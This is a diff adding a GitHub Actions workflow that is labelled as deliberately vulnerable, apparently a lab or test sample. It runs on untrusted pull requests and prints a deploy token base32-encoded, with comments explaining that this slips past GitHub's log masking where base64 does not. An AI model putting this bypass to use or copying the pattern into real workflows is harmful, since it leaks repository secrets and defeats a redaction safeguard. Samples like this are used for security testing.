@@ -1,0 +1,17 @@
+# VULNERABLE: Log-masking bypass to leak a secret in plaintext logs
+name: Vulnerable Log Masking Bypass
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Encode secret to dodge GitHub's log masking
+        run: |
+          # VULNERABLE: base32-encoding the secret bypasses ::add-mask:: redaction.
+          # (base64 is NOT a bypass — GitHub auto-masks the base64 form too; base32/
+          # hex/reversed/char-split do leak. Confirmed in the lab.)
+          echo "${{ secrets.DEPLOY_TOKEN }}" | base32
